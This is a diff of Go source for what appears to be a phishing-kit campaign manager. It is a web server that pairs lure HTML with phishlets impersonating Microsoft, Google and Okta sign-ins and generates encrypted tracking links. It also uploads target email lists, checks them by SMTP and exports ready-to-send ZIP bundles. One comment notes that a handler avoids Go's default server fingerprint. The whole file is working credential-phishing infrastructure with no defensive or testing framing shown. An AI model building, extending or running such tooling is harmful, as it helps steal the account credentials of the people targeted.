@@ -1,11 +1,10 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
+	"archive/zip"
+	"bytes"
 	"crypto/rand"
 	"embed"
-	"encoding/base64"
 	"encoding/csv"
 	"encoding/hex"
 	"encoding/json"
@@ -18,10 +17,12 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
-	"sort"
 	"strings"
-	"sync"
 	"time"
+
+	"github.com/strasser-lab/azure-phish-kit/campaign-manager/core"
+	"golang.org/x/text/cases"
+	"golang.org/x/text/language"
 )
 
 //go:embed templates/*
@@ -59,7 +60,7 @@ func main() {
 		log.Fatalf("FATAL: cannot parse templates: %v", err)
 	}
 
-	store := NewStore(*storePath)
+	store := core.NewStore(*storePath)
 	lures := scanLures(*luresPath)
 	phishlets := scanPhishlets(*phishletsPath)
 
@@ -123,12 +124,12 @@ func main() {
 			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "name, lure, and phishlet are required"})
 			return
 		}
-		c := Campaign{
+		c := core.Campaign{
 			ID:        genID(),
 			Name:      name,
 			Lure:      lure,
 			Phishlet:  phishlet,
-			Status:    "draft",
+			Status:    core.StatusDraft,
 			CreatedAt: time.Now().UTC().Format(time.RFC3339),
 		}
 		store.Put(c)
@@ -155,17 +156,23 @@ func main() {
 		}
 
 		// Derive brand from phishlet name
-		brand := deriveBrand(c.Phishlet)
+		brand := "microsoft"
+		switch {
+		case strings.Contains(c.Phishlet, "google"):
+			brand = "google"
+		case strings.Contains(c.Phishlet, "okta"):
+			brand = "okta"
+		}
 		templateName := strings.TrimSuffix(c.Lure, ".html")
 
-		link, err := GenerateLink(keyB64, redirect, c.ID, brand, templateName, "")
+		link, err := core.GenerateLink(keyB64, redirect, c.ID, brand, templateName, "")
 		if err != nil {
 			log.Printf("[ERROR] generate link: %v", err)
 			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
 			return
 		}
 		c.Link = link
-		c.Status = "active"
+		c.Status = core.StatusActive
 		store.Put(c)
 		writeJSON(w, http.StatusOK, map[string]string{"link": link})
 	})
@@ -177,27 +184,62 @@ func main() {
 			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
 			return
 		}
+
+		mode := r.URL.Query().Get("mode")
+		if mode == "" {
+			mode = "count"
+		}
+
+		// Handle file upload (optional for smtp mode if LeadFile already exists)
+		var csvPath string
 		file, _, err := r.FormFile("leads")
-		if err != nil {
+		if err == nil {
+			defer file.Close()
+			os.MkdirAll("../data/leads", 0755)
+			csvPath = fmt.Sprintf("../../.glnt-data/leads/%s.csv", id)
+			dst, err := os.Create(csvPath)
+			if err != nil {
+				writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to save file"})
+				return
+			}
+			defer dst.Close()
+			io.Copy(dst, file)
+			c.LeadFile = csvPath
+		} else if mode == "smtp" && c.LeadFile != "" {
+			csvPath = c.LeadFile
+		} else {
 			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "CSV file upload required (field: leads)"})
 			return
 		}
-		defer file.Close()
 
-		// Save uploaded CSV to disk
-		os.MkdirAll("../data/leads", 0755)
-		dstPath := fmt.Sprintf("../../.glnt-data/leads/%s.csv", id)
-		dst, err := os.Create(dstPath)
-		if err != nil {
-			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to save file"})
+		if mode == "smtp" {
+			total, valid, invalid, catchAll, err := core.VerifyLeads(csvPath, true, "")
+			if err != nil {
+				writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
+				return
+			}
+			c.LeadCount = total
+			c.Status = core.StatusVerified
+			store.Put(c)
+			writeJSON(w, http.StatusOK, map[string]interface{}{
+				"total":     total,
+				"valid":     valid,
+				"invalid":   invalid,
+				"catch_all": catchAll,
+				"status":    "ok",
+				"mode":      "smtp",
+			})
 			return
 		}
-		defer dst.Close()
-		io.Copy(dst, file)
 
-		// Re-read and count lines
-		dst.Seek(0, 0)
-		reader := csv.NewReader(dst)
+		// Default: count mode — count CSV lines
+		f, err := os.Open(csvPath)
+		if err != nil {
+			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to read file"})
+			return
+		}
+		defer f.Close()
+		reader := csv.NewReader(f)
 		count := 0
 		for {
 			_, err := reader.Read()
@@ -207,14 +249,14 @@ func main() {
 			count++
 		}
 
-		c.LeadFile = dstPath
 		c.LeadCount = count
-		c.Status = "verified"
+		c.Status = core.StatusVerified
 		store.Put(c)
 		writeJSON(w, http.StatusOK, map[string]interface{}{
 			"count":  count,
-			"file":   dstPath,
+			"file":   csvPath,
 			"status": "ok",
+			"mode":   "count",
 		})
 	})
 
@@ -225,17 +267,11 @@ func main() {
 			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
 			return
 		}
-		// Read the lure file content
 		lureFile := filepath.Join(*luresPath, c.Lure)
-		content, err := os.ReadFile(lureFile)
+		preview, err := core.PreviewLure(lureFile, c.Link)
 		if err != nil {
 			writeJSON(w, http.StatusNotFound, map[string]string{"error": "lure file not found"})
 			return
-		}
-		// Inject the link placeholder into the lure HTML
-		preview := strings.Replace(string(content), "##LINK##", c.Link, 1)
-		if c.Link == "" {
-			preview = strings.Replace(string(content), "##LINK##", "{{LINK_PLACEHOLDER}}", 1)
 		}
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
 		w.Write([]byte(preview))
@@ -255,9 +291,58 @@ func main() {
 			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
 			return
 		}
-		c.Status = "deployed"
+
+		// Generate filled lure template
+		lureFile := filepath.Join(*luresPath, c.Lure)
+		filled, err := core.PreviewLure(lureFile, c.Link)
+		if err != nil {
+			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "lure file not found: " + c.Lure})
+			return
+		}
+
+		// Read leads CSV (or use empty fallback)
+		var leadsData []byte
+		if c.LeadFile != "" {
+			leadsData, err = os.ReadFile(c.LeadFile)
+			if err != nil {
+				leadsData = []byte("email\n")
+			}
+		} else {
+			leadsData = []byte("email\n")
+		}
+
+		// Build README metadata
+		readme := fmt.Sprintf("Campaign: %s\nLure: %s\nPhishlet: %s\nLink: %s\nLead Count: %d\nCreated: %s\n",
+			c.Name, c.Lure, c.Phishlet, c.Link, c.LeadCount, c.CreatedAt)
+
+		// Assemble ZIP in memory
+		var buf bytes.Buffer
+		zw := zip.NewWriter(&buf)
+
+		fw, _ := zw.Create("lure.html")
+		fw.Write([]byte(filled))
+
+		fw, _ = zw.Create("leads.csv")
+		fw.Write(leadsData)
+
+		fw, _ = zw.Create("README.txt")
+		fw.Write([]byte(readme))
+
+		if err := zw.Close(); err != nil {
+			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to create zip"})
+			return
+		}
+
+		// Update status to deployed
+		c.Status = core.StatusDeployed
 		store.Put(c)
-		writeJSON(w, http.StatusOK, map[string]string{"status": "deployed"})
+
+		// Sanitize campaign name for ZIP filename
+		filename := strings.ToLower(strings.ReplaceAll(c.Name, " ", "-")) + ".zip"
+
+		w.Header().Set("Content-Type", "application/zip")
+		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
+		w.Write(buf.Bytes())
 	})
 
 	// Catch-all 404 handler — avoids Go's default fingerprint
@@ -269,86 +354,6 @@ func main() {
 	addr := ":" + *port
 	log.Printf("Campaign Manager listening on http://localhost%s", addr)
 	log.Fatal(http.ListenAndServe(addr, authMiddleware(*token, securityHeaders(mux))))
-}
-
-// ---------- Campaign Store ----------
-
-// Campaign represents a phishing campaign.
-type Campaign struct {
-	ID        string `json:"id"`
-	Name      string `json:"name"`
-	Lure      string `json:"lure"`
-	Phishlet  string `json:"phishlet"`
-	Link      string `json:"link"`
-	LeadFile  string `json:"lead_file"`
-	LeadCount int    `json:"lead_count"`
-	Status    string `json:"status"`
-	CreatedAt string `json:"created_at"`
-}
-
-// Store holds campaigns in memory, persisting to a JSON file.
-type Store struct {
-	mu    sync.RWMutex
-	path  string
-	items map[string]Campaign
-}
-
-func NewStore(path string) *Store {
-	s := &Store{path: path, items: make(map[string]Campaign)}
-	data, err := os.ReadFile(path)
-	if err == nil {
-		var campaigns []Campaign
-		if json.Unmarshal(data, &campaigns) == nil {
-			for _, c := range campaigns {
-				s.items[c.ID] = c
-			}
-			log.Printf("Loaded %d campaigns from %s", len(s.items), path)
-		}
-	}
-	return s
-}
-
-func (s *Store) List() []Campaign {
-	s.mu.RLock()
-	defer s.mu.RUnlock()
-	list := make([]Campaign, 0, len(s.items))
-	for _, c := range s.items {
-		list = append(list, c)
-	}
-	sort.Slice(list, func(i, j int) bool {
-		return list[i].CreatedAt > list[j].CreatedAt
-	})
-	return list
-}
-
-func (s *Store) Get(id string) (Campaign, bool) {
-	s.mu.RLock()
-	defer s.mu.RUnlock()
-	c, ok := s.items[id]
-	return c, ok
-}
-
-func (s *Store) Put(c Campaign) {
-	s.mu.Lock()
-	defer s.mu.Unlock()
-	s.items[c.ID] = c
-	s.persist()
-}
-
-func (s *Store) persist() {
-	list := make([]Campaign, 0, len(s.items))
-	for _, c := range s.items {
-		list = append(list, c)
-	}
-	data, err := json.Marshal(list)
-	if err != nil {
-		log.Printf("[ERROR] marshal store: %v", err)
-		return
-	}
-	os.MkdirAll(filepath.Dir(s.path), 0755)
-	if err := os.WriteFile(s.path, data, 0644); err != nil {
-		log.Printf("[ERROR] write store: %v", err)
-	}
 }
 
 // ---------- Lure Scanning ----------
@@ -395,7 +400,7 @@ func scanLures(dir string) []LureInfo {
 			// Unknown lure file — derive brand from filename
 			name := strings.TrimSuffix(e.Name(), ".html")
 			name = strings.ReplaceAll(name, "-", " ")
-			name = strings.Title(name)
+			name = cases.Title(language.English).String(name)
 			lures = append(lures, LureInfo{
 				Filename: e.Name(),
 				Brand:    name,
@@ -459,7 +464,7 @@ type listSummary struct {
 }
 
 type listPageData struct {
-	Campaigns []Campaign
+	Campaigns []core.Campaign
 	Summary   listSummary
 }
 
@@ -469,16 +474,16 @@ type newCampaignData struct {
 }
 
 type detailPageData struct {
-	Campaign  Campaign
+	Campaign  core.Campaign
 	Lures     []LureInfo
 	Phishlets []PhishletInfo
 }
 
-func buildSummary(campaigns []Campaign) listSummary {
+func buildSummary(campaigns []core.Campaign) listSummary {
 	s := listSummary{}
 	s.LinksGen = len(campaigns)
 	for _, c := range campaigns {
-		if c.Status == "active" || c.Status == "deployed" {
+		if c.Status == core.StatusActive || c.Status == core.StatusDeployed {
 			s.Active++
 		}
 		s.TotalTargets += c.LeadCount
@@ -545,95 +550,6 @@ func fetchEventsData() *eventsSummary {
 		es.LastCapture = "no data"
 	}
 	return es
-}
-
-// ---------- Link Generation (mirrors core/link.go) ----------
-
-func GenerateLink(keyB64, redirect, campaign, brand, templateName, email string) (string, error) {
-	key, err := b64Decode(keyB64)
-	if err != nil || len(key) != 32 {
-		return "", fmt.Errorf("invalid key: must be base64-encoded 32 bytes (got %d bytes)", len(key))
-	}
-
-	if brand == "" {
-		brand = "microsoft"
-	}
-	if templateName == "" {
-		templateName = "shared-doc"
-	}
-
-	lure := map[string]interface{}{
-		"v":  "1",
-		"b":  brand,
-		"t":  templateName,
-		"r":  redirect,
-		"c":  campaign,
-		"ts": time.Now().Unix(),
-	}
-	if email != "" {
-		lure["e"] = email
-	}
-
-	plaintext, err := json.Marshal(lure)
-	if err != nil {
-		return "", fmt.Errorf("marshal lure: %w", err)
-	}
-
-	encrypted, err := encryptAESGCM(plaintext, key)
-	if err != nil {
-		return "", fmt.Errorf("encrypt: %w", err)
-	}
-
-	prefix := make([]byte, 3)
-	if _, err := rand.Read(prefix); err != nil {
-		return "", fmt.Errorf("random prefix: %w", err)
-	}
-	full := append(prefix, encrypted...)
-
-	return base64URLEncode(full), nil
-}
-
-func deriveBrand(phishlet string) string {
-	switch {
-	case strings.Contains(phishlet, "microsoft"):
-		return "microsoft"
-	case strings.Contains(phishlet, "google"):
-		return "google"
-	case strings.Contains(phishlet, "okta"):
-		return "okta"
-	default:
-		return "microsoft"
-	}
-}
-
-// ---------- Crypto helpers ----------
-
-func b64Decode(s string) ([]byte, error) {
-	enc := base64.StdEncoding
-	if strings.ContainsAny(s, "-_") {
-		enc = base64.URLEncoding.WithPadding(base64.NoPadding)
-	}
-	return enc.DecodeString(s)
-}
-
-func base64URLEncode(src []byte) string {
-	return base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(src)
-}
-
-func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		return nil, err
-	}
-	return gcm.Seal(nonce, nonce, plaintext, nil), nil
 }
 
 // ---------- Utility ----------
